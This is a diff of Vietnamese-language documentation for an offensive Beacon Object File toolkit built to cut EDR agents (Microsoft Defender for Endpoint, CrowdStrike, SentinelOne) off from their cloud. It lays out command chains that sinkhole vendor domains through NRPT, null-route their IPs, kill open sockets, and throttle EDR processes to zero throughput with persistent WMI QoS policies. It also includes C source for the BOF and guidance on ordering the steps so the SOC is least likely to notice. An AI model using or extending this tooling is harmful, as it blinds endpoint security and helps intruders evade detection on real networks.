@@ -243,8 +243,12 @@ nrpt_sinkhole *.endpoint.microsoft.com;*.wdcp.microsoft.com;*.ods.opinsights.azu
 #   (lấy IP hiện tại: netstat -anob | findstr MsSense)
 null_route 20.190.128.1;20.190.129.1;52.183.20.1;13.89.176.1
 
-# Bước 4: Giới hạn QoS làm failsafe (cover IP/domain ta bỏ sót)
-edrchoker MsSense.exe;MsSenseS.exe;SenseNdr.exe
+# Bước 4: Kill connections đang mở
+#   LƯU Ý: MsSense.exe chạy dưới PPL-Antimalware — PROCESS_DUP_HANDLE bị từ chối.
+#   Bỏ qua sock_kill với MDE; connection cũ sẽ tự drop, reconnect bị block vĩnh viễn bởi NRPT + null_route.
+
+# Bước 5: Giới hạn QoS làm failsafe (cover IP/domain ta bỏ sót)
+edrchoker_v2 add "MsSense.exe;MsSenseS.exe;SenseNdr.exe"
 ```
 
 **Kết quả đạt được:**
@@ -281,8 +285,12 @@ nrpt_sinkhole *.falcon.crowdstrike.com;*.cloudsink.net;*.crowdstrike.com
 #   (lấy IP hiện tại: Resolve-DnsName ts01-b.cloudsink.net)
 null_route 35.232.0.1;34.102.200.1;34.102.201.1
 
-# Bước 4: QoS throttle làm failsafe
-edrchoker CSFalconService.exe;CSFalconContainer.exe
+# Bước 4: Kill connections đang mở
+#   LƯU Ý: CSFalconService.exe chạy dưới PPL-Antimalware — PROCESS_DUP_HANDLE bị từ chối.
+#   Bỏ qua sock_kill với CrowdStrike; dùng NRPT + null_route để chặn reconnect.
+
+# Bước 5: QoS throttle làm failsafe
+edrchoker_v2 add "CSFalconService.exe;CSFalconContainer.exe"
 ```
 
 **Hành vi CrowdStrike dự kiến sau chain:**
@@ -312,8 +320,11 @@ nrpt_sinkhole *.sentinelone.net;*.pax.sentinelone.net
 #   (lấy IP hiện tại: Resolve-DnsName usea1.pax.sentinelone.net)
 null_route 54.80.0.1;3.213.0.1;3.214.0.1
 
-# Bước 4: QoS throttle làm failsafe
-edrchoker SentinelAgent.exe;SentinelServiceHost.exe
+# Bước 4: Kill connections đang mở (SentinelOne non-PPL — sock_kill được)
+sock_kill kill SentinelAgent.exe;SentinelServiceHost.exe
+
+# Bước 5: QoS throttle làm failsafe
+edrchoker_v2 add "SentinelAgent.exe;SentinelServiceHost.exe"
 ```
 
 **Hành vi SentinelOne dự kiến sau chain:**
@@ -352,13 +363,15 @@ Agent SentinelOne vào "disconnected mode". Phân tích tĩnh tại chỗ (Stati
 | Alert EDR console | Nhiều EDR vendor phát hiện mất ETW-TI session từ phía server (họ thấy telemetry dừng đột ngột) và tạo alert "sensor disconnected". | Đây là trade-off: phát hiện local bị dừng, nhưng SOC có thể được cảnh báo. Trong operation thời gian nhạy cảm, chấp nhận rủi ro này. |
 | Tên session không rõ | Vendor có thể dùng tên session không có tài liệu, không có trong danh sách mặc định. | Dùng `logman query` hoặc `etwtrace list` để enumerate session đang chạy trước, sau đó truyền tên tùy chỉnh vào BOF. |
 
-### Điểm Yếu của edrchoker (BOF hiện có, ghi lại để hoàn chỉnh)
+### Điểm Yếu của edrchoker_v2
 
 | Rủi Ro | Mô Tả | Cách Khắc Phục |
 |--------|--------|----------------|
-| Bypass QoS | Một số process bypass QoS bằng cách dùng raw socket hoặc gọi ở priority cao. | Không khả thi với EDR agent chuẩn dùng WinHTTP / WinSock. |
-| Phát hiện WMI watchdog | WMI permanent subscription là cơ chế persistence được biết đến rộng rãi và được nhiều EDR giám sát. | Áp dụng ETW tamper trước khi install watchdog. |
-| Phạm vi policy | `AppPathNameMatchCondition` khớp theo tên process (không phải đường dẫn đầy đủ). Process đổi tên thành `MsSense.exe` cũng bị throttle. | Chấp nhận side effect này hoặc thêm path matching nếu có. |
+| Process con tên khác | EDR có thể spawn process con với tên khác để upload telemetry (ví dụ `SenseNdr.exe` từ `MsSense.exe`). Chỉ process cha bị throttle, con thì không. | Enumerate tên process con (`tasklist /fi "imagename eq Sense*"`) rồi thêm tất cả vào list. |
+| NDIS protocol driver (kernel) | Nếu kernel component của EDR gửi data qua NDIS protocol driver trực tiếp (không qua `tcpip.sys`), `pacer.sys` không xác định được process owner — throttle không áp dụng. | Kết hợp `null_route` để block ở tầng routing bất kể ai gửi. |
+| Route qua system process | Nếu EDR dùng BITS (`svchost.exe`) hoặc WinHTTP service làm proxy upload, socket owner là `svchost.exe`. Không thể throttle svchost. | Dùng `null_route` block IP cloud. |
+| Phạm vi policy | `AppPathNameMatchCondition` khớp theo tên process (không phải đường dẫn đầy đủ). | Chấp nhận side effect — trong thực tế không có false positive. |
+| Psched không chạy | Nếu service `Psched` bị stop/disable, policy ghi được vào WMI nhưng `pacer.sys` không load — không có enforcement. | Chạy `edrchoker_v2 check` để xác nhận Psched state trước khi dùng. |
 
 ### Tóm Tắt Rủi Ro Chain Kết Hợp
 
@@ -381,10 +394,9 @@ Agent SentinelOne vào "disconnected mode". Phân tích tĩnh tại chỗ (Stati
                      SOC khả năng
                      nhận alert)
 
-  edrchoker          TRUNG BÌNH         CAO             CAO (xóa WMI
-                     (WMI subscription  (0 throughput)   subscription)
-                     có thể bị phát
-                     hiện)
+  edrchoker_v2       THẤP               CAO             CAO (chạy
+                     (ghi WMI policy;   (0 throughput)   remove_all)
+                     không subscription)
   ──────────────────────────────────────────────────────────────────────
 ```
 
@@ -392,7 +404,8 @@ Agent SentinelOne vào "disconnected mode". Phân tích tĩnh tại chỗ (Stati
 1. `etw_tamper` trước — giảm khả năng giám sát local của EDR trước khi làm các bước khác
 2. `nrpt_sinkhole` — chặn DNS trước khi EDR kịp tạo kết nối mới
 3. `null_route` — chặn hardcoded IP
-4. `edrchoker` — failsafe throughput cap cho các kết nối lọt qua
+4. `sock_kill` — RST connections đang mở (chỉ non-PPL target)
+5. `edrchoker_v2` — failsafe throughput cap cho các kết nối lọt qua
 
 Thứ tự này thu hẹp tối đa khoảng thời gian mà EDR đang bị suy yếu một phần nhưng vẫn còn khả năng phát hiện và báo cáo hoạt động suy yếu đó.
 
@@ -458,10 +471,12 @@ Traffic bị throttle ngay lập tức (ActiveStore)
 
 | Store | Lưu ở đâu | Hiệu lực | Sau reboot |
 |-------|-----------|----------|-----------|
-| `ActiveStore` | Kernel memory (pacer.sys) | Ngay lập tức | MẤT |
+| `ActiveStore` | Kernel memory (pacer.sys) | Ngay lập tức | MẤT (lý thuyết) |
 | `PersistentStore` | WMI Repository (`%SystemRoot%\System32\wbem\Repository\OBJECTS.DATA`) | Sau reboot | CÒN |
 
-**edrchoker_v2 ghi cả hai** — do đó policy vừa active ngay, vừa tồn tại sau reboot.
+**edrchoker_v2 chỉ ghi ActiveStore.** Tuy nhiên, WMI provider của `MSFT_NetQosPolicySettingData` không ghi thẳng vào kernel memory khi gọi `PutInstance(ActiveStore)` — nó ánh xạ sang store `GPO:localhost` (local Group Policy QoS store), là policy store persistent được lưu trong WMI repository và được `NetQosSvc` restore khi boot.
+
+Kết quả: `PutInstance(ActiveStore)` vừa có hiệu lực ngay, vừa persist sau reboot — mà không cần gọi `PutInstance(PersistentStore)` riêng. Gọi `PutInstance(PersistentStore)` trực tiếp sẽ bị WMI provider reject.
 
 ### 5.3 Tại Sao Persist Sau Khi EDR Restart
 
@@ -637,34 +652,28 @@ static BOOL CreatePolicyInStore(IWbemServices* svc, const wchar_t* proc,
 **Tại sao `ThrottleRateAction` phải là string:**
 WMI schema khai báo `ThrottleRateAction` là `uint64` nhưng WMI serialization trong `ROOT\StandardCimv2` encode uint64 property dưới dạng string. Đây là quirk của WMI provider — cố set `VT_UI8 = 8` thì `PutInstance` trả `WBEM_E_TYPE_MISMATCH (0x80041008)`.
 
-### 6.6 CreatePolicy — Dual Store Write (v2, đã bỏ verify)
+### 6.6 CreatePolicy — Single ActiveStore Write
 
 ```c
 static BOOL CreatePolicy(IWbemServices* svc, const wchar_t* proc) {
-    wchar_t name[9]; RandName(name, 8);          // generate random 8-char name
-
-    BOOL okA = CreatePolicyInStore(svc, proc, name, L"ActiveStore");
-    BOOL okP = CreatePolicyInStore(svc, proc, name, L"PersistentStore");
-
-    if (!okA && !okP) {
+    wchar_t name[9]; RandName(name, 8);
+    /* ActiveStore write is sufficient — provider stores it as GPO:localhost
+     * which is the local Group Policy QoS store and persists across reboots. */
+    if (!CreatePolicyInStore(svc, proc, name, L"ActiveStore")) {
         BeaconPrintf(CALLBACK_ERROR, "  [-] %S: PutInstance failed\n", proc);
         return FALSE;
     }
-
-    const wchar_t* sA; if (okA) { sA = L"ok"; } else { sA = L"fail"; }
-    const wchar_t* sP; if (okP) { sP = L"ok"; } else { sP = L"fail"; }
-
-    BeaconPrintf(CALLBACK_OUTPUT,
-        "  [+] %S -> '%S' active=%S persist=%S\n",
-        proc, name, sA, sP);
-    return okA || okP;
+    BeaconPrintf(CALLBACK_OUTPUT, "  [+] %S -> '%S'\n", proc, name);
+    return TRUE;
 }
 ```
 
-**Tại sao ghi cả hai store:**
-- `ActiveStore` only: policy active ngay nhưng mất sau reboot
-- `PersistentStore` only: policy chưa active cho đến khi reboot
-- Cả hai: active ngay + persist sau reboot (như `New-NetQosPolicy -PolicyStore All`)
+**Tại sao chỉ ghi ActiveStore:**
+- `PutInstance(ActiveStore)` → WMI provider ánh xạ sang `GPO:localhost` store → vừa active ngay, vừa persist sau reboot
+- `PutInstance(PersistentStore)` → WMI provider reject (provider không support direct PersistentStore write)
+- `ExecMethod("Create")` → `WBEM_E_NOT_FOUND (0x80041002)` → class không có method Create
+
+Ghi một lần là đủ. Ghi cả hai chỉ thêm một round-trip COM thất bại.
 
 **Tại sao không dùng ternary operator:** Theo yêu cầu project — code đơn giản, dễ đọc, không có toán tử ba ngôi.
 
@@ -672,8 +681,10 @@ static BOOL CreatePolicy(IWbemServices* svc, const wchar_t* proc) {
 
 ```c
 static void BuildRemoveWQL(wchar_t* out, int max, wchar_t* list) {
+    /* Filter by ThrottleRateAction = '8' to avoid touching non-edrchoker policies. */
     int p = WAppend(out, 0, max,
-        L"SELECT * FROM MSFT_NetQosPolicySettingData WHERE ");
+        L"SELECT * FROM MSFT_NetQosPolicySettingData"
+        L" WHERE ThrottleRateAction = '8' AND (");
     wchar_t* c = list; wchar_t* tok; BOOL first = TRUE;
     while ((tok = WNextTok(&c)) != NULL) {
         if (!first) p = WAppend(out, p, max, L" OR ");
@@ -682,16 +693,21 @@ static void BuildRemoveWQL(wchar_t* out, int max, wchar_t* list) {
         if (p < max - 1) out[p++] = L'\'';
         first = FALSE;
     }
+    if (p < max - 1) out[p++] = L')';
     out[p] = L'\0';
 }
 ```
 
 **Ví dụ output với input `"MsSense.exe;elastic-endpoint.exe"`:**
 ```sql
-SELECT * FROM MSFT_NetQosPolicySettingData WHERE
-  AppPathNameMatchCondition = 'MsSense.exe' OR
-  AppPathNameMatchCondition = 'elastic-endpoint.exe'
+SELECT * FROM MSFT_NetQosPolicySettingData
+  WHERE ThrottleRateAction = '8' AND (
+    AppPathNameMatchCondition = 'MsSense.exe' OR
+    AppPathNameMatchCondition = 'elastic-endpoint.exe'
+  )
 ```
+
+**Tại sao thêm `ThrottleRateAction = '8'`:** `remove` mode trước đây chỉ filter theo `AppPathNameMatchCondition` — có thể vô tình xóa QoS policy hợp lệ của hệ thống hoặc admin nếu trùng tên process. Thêm filter `ThrottleRateAction = '8'` đảm bảo chỉ xóa policy do edrchoker tạo.
 
 `ExecDeleteQuery` sau đó:
 1. `ExecQuery()` với WQL trên → iterator
@@ -1071,7 +1087,7 @@ Sau khi apply full chain, EDR process vẫn running nhưng:
 | WMI COM | Có | Có | **Không** |
 | WMI subscription watchdog | **Có** (VBScript tự reinstall) | Không | Không |
 | Hiệu lực ngay | Có (ActiveStore) | Có (ActiveStore) | **Không** (cần reboot/gpupdate) |
-| Persist sau reboot | Có (PersistentStore + watchdog) | Có (PersistentStore) | Có (registry) |
+| Persist sau reboot | Có (PersistentStore + watchdog) | Có (ActiveStore → GPO:localhost) | Có (registry) |
 | DLL imports | OLE32, OLEAUT32, KERNEL32 | OLE32, OLEAUT32, KERNEL32 | **ADVAPI32, KERNEL32** |
 | DCOM local RPC | Có | Có | Không |
 | WMI provider events | Có | Có | **Không** |
@@ -1234,8 +1250,11 @@ v2 chỉ có `ListPolicies(svc)` — một param, không check watchdog (không 
 | `edrchoker.bof.c` (v1) | `ListPolicies` dùng `SELECT * FROM MSFT_NetQosPolicySettingData` không filter → hiển thị toàn bộ QoS policy của hệ thống | Thêm `WHERE ThrottleRateAction = '8'` |
 | `edrchoker.bof.c` (v1) | `remove_all` dùng query không filter → có thể xóa system QoS policy | Thêm `WHERE ThrottleRateAction = '8'` |
 | `edrchoker.bof.c` (v1) | `PutI4()` defined nhưng không được gọi ở bất kỳ đâu (dead code) | Xóa hàm |
-| `edrchoker_v2.bof.c` (v2) | `CreatePolicy` có verify step: gọi `GetObject(__PATH)` sau `PutInstance` để xác nhận — thêm một COM round-trip không cần thiết | Bỏ verify block, đơn giản hóa output thành `active=%S persist=%S` |
+| `edrchoker_v2.bof.c` (v2) | `CreatePolicy` có verify step: gọi `GetObject(__PATH)` sau `PutInstance` để xác nhận — thêm một COM round-trip không cần thiết | Bỏ verify block, đơn giản hóa output |
 | `edrchoker_v2.bof.c` (v2) | `ListPolicies` và `remove_all` không filter (giống v1) | Thêm `WHERE ThrottleRateAction = '8'` |
+| `edrchoker_v2.bof.c` (v2) | `CreatePolicy` cố ghi `PersistentStore` riêng — WMI provider reject, output luôn `persist=fail` | Bỏ hoàn toàn PersistentStore write; chỉ ActiveStore — provider tự map sang GPO:localhost (persistent) |
+| `edrchoker_v2.bof.c` (v2) | `BuildRemoveWQL` (`remove` mode) không filter theo `ThrottleRateAction = '8'` — có thể xóa QoS policy không phải của edrchoker nếu trùng tên process | Thêm `WHERE ThrottleRateAction = '8' AND (...)` vào query |
+| `edrchoker_v2.bof.c` (v2) | Comment header dòng 10 nói `ActiveStore + PersistentStore` — sai sau khi bỏ PersistentStore | Cập nhật thành `ActiveStore; provider maps to GPO:localhost` |
 | `edrchoker_v3.bof.c` (v3) | `ListQosPolicies` liệt kê tất cả subkey trong `HKLM\...\QoS` — bao gồm cả policy của Group Policy/system | Đọc thêm `Throttle Rate` value per subkey, skip nếu ≠ `"8"` |
 | `edrchoker_v3.bof.c` (v3) | `DeleteQosPolicies(NULL)` (remove_all) xóa tất cả QoS registry key không phân biệt nguồn gốc | Thêm check: khi `matchList == NULL`, chỉ xóa nếu `Throttle Rate = "8"` |
 
